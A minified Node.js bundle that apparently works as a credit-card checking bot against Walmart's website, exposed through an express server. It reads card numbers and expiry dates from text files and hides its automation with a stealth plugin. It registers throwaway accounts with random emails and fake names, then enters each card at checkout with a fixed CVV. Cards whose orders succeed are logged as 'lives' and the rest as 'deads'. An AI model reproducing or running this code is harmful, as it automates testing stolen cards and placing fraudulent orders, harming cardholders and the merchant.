var n=(t,e)=>()=>(e||t((e={exports:{}}).exports,e),e.exports);var T=n((mi,k)=>{var vt=require("fs"),ht=new Promise((t,e)=>{vt.readFile("./db/deads.txt","utf8",(i,a)=>{i&&e(i),t(a.split(`
`).filter(o=>o.length>0))})});k.exports={deads:ht}});var q=n((fi,g)=>{var mt=require("fs"),ft=new Promise((t,e)=>{mt.readFile("./db/lives.txt","utf8",(i,a)=>(i&&e(i),t(a.split(`
`).filter(o=>o.length>0))))});g.exports={lives:ft}});var S=n((bi,C)=>{var bt=require("fs"),pt=new Promise((t,e)=>{bt.readFile("./db/tarjetas.txt","utf8",(i,a)=>{i&&e(i),a=a.split(`
`).filter(d=>d.length>0);let o=a.filter(d=>d.includes("|")),r=a.filter(d=>d.includes("|")==!1).map(d=>`${d}${o}`);t(r)})});C.exports={tarjetas:pt}});var v=n((pi,_)=>{var{deads:Ft}=T(),{lives:xt}=q(),{tarjetas:yt}=S();_.exports={deads:Ft,lives:xt,tarjetas:yt}});var N=n((Fi,j)=>{var{tarjetas:kt}=v(),$=[],h=[],P=[],D=[];kt.then(t=>{for(var e of t)h.includes(e)==!1&&h.push(e);for(var i of h){var a=i.split("|")[0],o=i.split("|")[1],c=parseInt(i.split("|")[2]);$.push(a),P.push(o),D.push(c)}});j.exports={cards:$,fechaMes:P,fechaA\u00F1o:D}});var A=n((yi,O)=>{var Tt=require("fs"),xi=require("colors"),{deads:gt}=v(),qt=async t=>{if((await gt).filter(a=>a==t).length>0)return console.log(`${t.yellow} este ${"dead".red} ya existe en db/deads.txt`);Tt.appendFile("./db/deads.txt",t+`
`,{encoding:"utf-8"},a=>{if(a)throw a;return console.log(`${t.red}`)})};O.exports={agregarDeads:qt}});var M=n((ki,z)=>{var G=require("fs"),Ct=t=>{G.readFile("./db/tarjetas.txt","utf8",(e,i)=>{let a=i.split(`
`).filter(r=>r.length>0),o=a.filter(r=>r!=t);if(a.length===o.length)return console.log("se ha colocado una tarjeta invalida");let c=o.join(`
`);G.writeFile("./db/tarjetas.txt",c,r=>{if(r)throw r})})};z.exports={barridoTarjetas:Ct}});var L=n((gi,X)=>{var St=require("fs"),Ti=require("colors"),{lives:_t}=v(),$t=async t=>{let e=t.split("|")[0];await _t.then(i=>{if(console.log(i),i.filter(o=>o===t).length>0)return console.log(`${t.yellow} este live ya existe en db/live.txt`);St.appendFile("./db/lives.txt",t+`
`,{encoding:"utf-8"},o=>{if(o)throw o;return console.log(`${e.green}`)})})};X.exports={agregarLive:$t}});var B=n((qi,R)=>{var Pt=(t,e)=>{(!e||e<1)&&(e=t.length);for(let i=0;i<e;++i){let a=Math.floor(Math.random()*t.length),o=Math.floor(Math.random()*t.length),c=t[a];t[a]=t[o],t[o]=c}};R.exports={disorder:Pt}});var U=n((Ci,E)=>{var{disorder:Dt}=B(),{faker:m}=require("@faker-js/faker"),jt=require("fs"),Nt=async({page:t,productoPersonalizado:e})=>{console.log("no tienes cuenta creada, se procedera a crear una".yellow);let i="https://www.walmart.com/account/?action=Create&rm=true",a=m.internet.password(10,!0,/[A-Z][0-9][a-z]/,"@Hookom119"),o=["a","b","c","d","e","f","g","h","i","1","2","6","3","z","h","1","9","0","o","p","Z","i","1","2","6","3","z","h","1","9","0","o","p","Z"];Dt(o),o=o.toString().replaceAll(",","")+"@gmail.com",await t.goto("https://www.walmart.com/account/signup?vid=oaoh"),await t.waitForSelector("#sign-in-form > div > div > input"),await t.type("#sign-in-form > div > div > input",o),await t.click("#sign-in-form > button"),await t.waitForNavigation(),await t.waitForSelector("#sign-up-form > div:nth-child(2) > div > input"),await t.waitForTimeout(1e3),await t.type("#sign-up-form > div:nth-child(2) > div > input",m.name.firstName()),await t.type("#sign-up-form > div:nth-child(4) > div > input",m.name.lastName()),await t.type("#sign-up-form > div:nth-child(7) > div > div > input",a),await t.click("#sign-up-form > button"),await t.waitForNavigation(),await t.waitForTimeout(1e3),await t.$("div > button > svg")&&await t.click("div > button > svg"),await t.waitForTimeout(1e3),i==="https://www.walmart.com/account/?action=Create&rm=true"&&console.log("Cuenta creada correctamente".green),await t.goto(e||"https://www.walmart.com/ip/seort/10448549"),await t.waitForSelector(".dib > button"),await t.waitForTimeout(3e3),await t.click(".dib > button"),await t.waitForTimeout(3e3),await t.goto("https://www.walmart.com/cart"),await t.waitForSelector(".flex .sticky .shadow-1 div .ph3  button"),await t.click(".flex .sticky .shadow-1 div .ph3  button"),await t.waitForTimeout(6e3),await t.$("div > div > section > div > div:nth-child(4) > div")&&(await t.click("div > div > section > div > div:nth-child(4) > div"),await t.waitForTimeout(1e3),await t.waitForSelector("div.ba.b--light-gray.w-100.bg-white.flex.br-pill.items-center > input"),await t.type("div.ba.b--light-gray.w-100.bg-white.flex.br-pill.items-center > input","10001"),await t.waitForSelector("div.pa0.ma0 > div:nth-child(1) > label"),await t.click("div.pa0.ma0 > div:nth-child(1) > label"),await t.waitForTimeout(1e3),await t.waitForSelector("div.w-100.pa4.bt.b--near-white > button"),await t.click("div.w-100.pa4.bt.b--near-white > button"),await t.waitForTimeout(1e3),await t.waitForSelector("div.flex.justify-center.pb6 > div > div > div > div > button"),await t.click("div.flex.justify-center.pb6 > div > div > div > div > button"),await t.waitForNavigation(),console.log("producto agregado al carrito".green)),await t.waitForSelector("#totalSummary"),await t.waitForTimeout(2e3);let d=!0;do{let l=t.mainFrame().url();await t.waitForTimeout(1e3),l.search("checkout")!=-1&&(jt.writeFile("./db/carritoUrl.txt",l,"utf8",s=>{if(s)throw s;console.log("carrito extraido con \xE9xito".green)}),d=!1)}while(d)};E.exports={login:Nt}});var f=n((Si,Z)=>{var{login:Ot}=U(),At=require("fs"),Gt=async({page:t,productoPersonalizado:e})=>{let i="#__next > div:nth-child(1) > div > span > header > div:nth-child(7) > a";return console.log("iniciando scrapper..."),await t.goto("https://www.walmart.com"),await t.waitForSelector(i),(await t.$eval(i,o=>o.href)).includes("https://www.walmart.com/account/login?vid=oaoh")===!0?(await Ot({page:t,productoPersonalizado:e}),At.readFileSync("./db/carritoUrl.txt","utf-8")):console.log("Ya existe un usuario".yellow)};Z.exports={verifyLogin:Gt}});var b=n((_i,H)=>{var zt=async({page:t})=>{let e='button[data-automation-id="fulfillment-continue"]';await t.waitForTimeout(1e3);let i=await t.$(e),a=await t.mainFrame().url();a.search("fulfillment")!=-1&&await t.waitForSelector(e),i&&a.search("fulfillment")!=-1&&(await t.click(e),await t.waitForNavigation())};H.exports={stepOneFullFillMentPhoto:zt}});var p=n(($i,V)=>{var Mt=async({page:t})=>{let e='button[data-automation-id="address-book-action-buttons-on-continue"]',i="#firstName",a="#lastName",o="#phone",c="#addressLineOne",r="div:nth-child(6) > div > button.button.button--link > span",d=!0;await t.waitForTimeout(1e3);let l=await t.$(i),s=await t.mainFrame().url();if(s.search("shipping-address")!=-1&&await t.waitForSelector(i),await t.waitForTimeout(1e3),l&&s.search("shipping-address")!=-1){i&&(await t.waitForSelector(i),await t.type(i,"John"),await t.type(a,"Lenon"),await t.type(o,"2121523478"),await t.type(c,"Calle buena"),await t.waitForTimeout(200),await t.click(e),await t.waitForSelector(r),await t.waitForTimeout(1e3),await t.click(r),await t.waitForSelector('[data-automation-id="address-tile-1"]'),await t.waitForTimeout(1e3)),await t.waitForSelector(e),await t.waitForTimeout(1e3),await t.click(e);do await t.waitForTimeout(1e3),d=await t.$("div.spinner.spinner-large.spinner-colorize.spinner-fixed");while(d)}};V.exports={stepTwoFullFillMentPhoto:Mt}});var Y=n((Pi,W)=>{var{stepOneFullFillMentPhoto:Xt}=b(),{stepTwoFullFillMentPhoto:Lt}=p(),Rt=async({page:t})=>{let e="#dropArea > div.device > label",i="button.btn.btn-primary.btn-md-long.action.mb-0.font-weight-bold[disabled]",a='a[class="btn btn-primary btn-add-to-cart disabled"]',o="#zip-code-popover > div > div > input";await t.goto("https://photos3.walmart.com/order/prints-builder?finish=glossy&size=4x4&copies=1#"),await t.waitForSelector(e),await t.waitForTimeout(1e3);let[c]=await Promise.all([t.waitForFileChooser(),t.click(e)]);await c.accept(["./assets/logo.png"]);let r=!0;do await t.waitForTimeout(1e3),r=await t.$(i);while(r);await t.waitForTimeout(1500),await t.click('button[aria-label="Add photos"]'),r=!0;do await t.waitForTimeout(1e3),r=await t.$(a);while(r);await t.click('a[class="btn btn-primary btn-add-to-cart"]'),await t.waitForSelector("#popover-anchor"),await t.waitForTimeout(1e3),await t.click("#popover-anchor"),await t.waitForSelector(o),await t.click(o),await t.click(o),await t.type(o,"10001"),await t.waitForTimeout(1e3),await t.click("#zip-code-popover > div > button.btn.btn-primary"),await t.waitForTimeout(1e3),await t.click("a.checkout-button.btn.btn-primary.btn-lg.btn-block"),await t.waitForNavigation(),await Xt({page:t}),await Lt({page:t})};W.exports={fotoAuto:Rt}});var K=n((Di,Q)=>{var J=require("puppeteer-extra"),{cards:w,fechaMes:F,fechaA\u00F1o:x}=N(),Bt=require("puppeteer-extra-plugin-stealth"),{agregarDeads:Et}=A(),{barridoTarjetas:I}=M(),{agregarLive:Ut}=L(),Zt=require("fs"),{verifyLogin:Ht}=f(),{fotoAuto:Vt}=Y(),{stepOneFullFillMentPhoto:Wt}=b(),{stepTwoFullFillMentPhoto:Yt}=p();J.use(Bt());var It=async({productoPersonalizado:t})=>{let e=0;countl=0,contador=1;let i,a=await J.launch({headless:!1,defaultViewport:null,ignoreHTTPSErrors:!0,userDataDir:"./userData",executablePath:"C:/Program Files/Google/Chrome/Application/chrome.exe",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]}),o=(await a.pages())[0];o.setDefaultTimeout(0),o.setDefaultNavigationTimeout(0),await Ht({page:o}),await o.goto("https://www.walmart.com/checkout/photo#/payment");let c=Zt.readFileSync("./db/carritoUrl.txt","utf-8");for(var r=0;r<=w.length;++r){let l=!0,s=!0;await o.waitForTimeout(3e3),await o.$('div[data-modal-message-descriptor="PhotoPCExpiredMessage"]')&&await Vt({page:o}),await Wt({page:o}),await Yt({page:o});do{await o.$("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div.expandable-modules.checkout-responsive-container > div:nth-child(3) > div > div > div > div > div > div > div.CXO_module_header_edit > button")&&(await o.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div.expandable-modules.checkout-responsive-container > div:nth-child(3) > div > div > div > div > div > div > div.CXO_module_header_edit > button"),await o.waitForTimeout(2500),s=!1),await o.$("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span")&&(await o.waitForSelector("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span"),await o.waitForTimeout(1e3),await o.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div:nth-child(2) > div > div.card-body.clearfix > div.credit-card-actions > button.button.last.cc-delete-action.button--link > span"),await o.waitForTimeout(1e3),await o.waitForSelector("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span"),await o.waitForTimeout(1e3),await o.click("body > div.js-content > div > div.checkout-wrapper > div > div.accordion-inner-wrapper > div.checkout-accordion > div > div > div > div:nth-child(3) > div.CXO_module_container > div.CXO_module_body.ResponsiveContainer > div > div > div > div.text-left.Grid > div:nth-child(2) > div > div > div > div.text-left.Grid > div:nth-child(1) > div > div > div > div > div > div > div > div.credit-card-full-actions > button.button.cc-confirm-delete.button--ghost > span"),await o.waitForSelector("#firstName"),s=!1);let ut=await o.$("#firstName");await o.waitForTimeout(2e3),ut&&(await o.type("#creditCard",`${w[r]}`),await o.type("#month-chooser",`${F[r]}`),await o.type("#year-chooser",`${x[r]}`),await o.type("#cvv","065"),await o.waitForTimeout(1e3),await o.click("div > form > div.edit-form-actions > div > button"),await o.waitForTimeout(2e3),s=!1)}while(s);do await o.waitForTimeout(1e3),l=await o.$("div.spinner.spinner-large.spinner-colorize.spinner-fixed");while(l);if(console.log(contador," ",w[r]),e==0&&(i=await a.newPage(),i.setDefaultTimeout(0),i.setDefaultNavigationTimeout(0)),await i.bringToFront(),await i.waitForTimeout(2e3),await i.goto(c),await i.waitForSelector("#cvv-field"),await i.$("#cvv-field")){await i.type("#cvv-field","123"),await o.waitForTimeout(1e3),await i.click("#mobile-sticky-footer > div > section > button"),await i.waitForTimeout(7e3);let wt=await i.$("body > div:nth-child(18) > div > div.w_HB > div.w_GY.w_GZ > div > div.w_Gh > div > div > div.w_Q.w_U.mb1");t:var d=i.mainFrame().url();d.search("thankyou")!=-1&&(countl++,console.log("lives del lote",countl),await Ut(`${w[r]}|${F[r]}|${x[r]}`),I(`${w[r]}`),await i.goto(t||"https://www.walmart.com/ip/seort/10448549"),await i.waitForSelector(".dib > button"),await i.waitForTimeout(3e3),await i.click(".dib > button"),await i.waitForTimeout(3e3),await i.goto("https://www.walmart.com/cart"),await i.waitForSelector(".flex .sticky .shadow-1 div .ph3  button"),await i.click(".flex .sticky .shadow-1 div .ph3  button"),await i.waitForTimeout(7e3)),d.search("thankyou")==-1&&(await Et(`${w[r]}|${F[r]}|${x[r]}`),I(`${w[r]}`)),i&&(e=1),await o.bringToFront(),contador++}}await a.close()};Q.exports={foto:It}});var ot=n((ji,it)=>{var tt=require("puppeteer-extra"),Jt=require("puppeteer-extra-plugin-stealth"),{verifyLogin:Qt}=f();tt.use(Jt());var Kt=async({productoPersonalizado:t})=>{let e=await tt.launch({headless:!1,defaultViewport:null,executablePath:"C:/Program Files/Google/Chrome/Application/chrome.exe",userDataDir:"./userData",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]}),i=(await e.pages())[0];return await i.setDefaultTimeout(0),await i.setDefaultNavigationTimeout(0),await Qt({page:i,productoPersonalizado:t}),await e.close()};it.exports={loginAuto:Kt}});var rt=n((Ni,at)=>{var et=require("puppeteer-extra"),ti=require("puppeteer-extra-plugin-stealth");et.use(ti());var ii=async({tipo:t})=>{let i=(await(await et.launch({headless:!1,defaultViewport:null,userDataDir:"./userData",executablePath:"C:/Program Files/Google/Chrome/Application/chrome.exe",args:["--start-maximized","--disable-gpu","--disable-dev-shm-usage","--disable-setuid-sandbox","--no-sandbox"]})).pages())[0];await i.setDefaultTimeout(0),await i.bringToFront(),t=="manual-login"&&await i.goto("https://www.walmart.com/account/login"),t=="manual-foto"&&await i.goto("https://photos3.walmart.com/order/prints-builder?finish=glossy&size=4x4&copies=1#")};at.exports={manual:ii}});var dt=n((Oi,nt)=>{var{foto:oi}=K(),{loginAuto:ei}=ot(),{manual:ai}=rt(),ri=async({tipo:t,productoPersonalizado:e})=>{t==="foto"&&oi({productoPersonalizado:e}),t==="login"&&ei({productoPersonalizado:e}),(t==="manual-login"||t==="manual-foto")&&ai({tipo:t})};nt.exports={selectorScrapper:ri}});var lt=n((Ai,st)=>{var{Router:ni}=require("express"),{selectorScrapper:di}=dt(),ct=ni();ct.post("/",async(t,e)=>{let{tipo:i,productoPersonalizado:a}=t.body;await di({tipo:i,productoPersonalizado:a}),e.send()});st.exports=ct});var y=require("express"),ci=lt(),si=require("detect-port"),u=y(),li=async()=>(await si().then(t=>{u.set("port",t)}),u.use(y.urlencoded({extended:!1})),u.use(y.json()),u.use(ci),u.listen(u.get("port")),u.get("port"));module.exports={server:li};
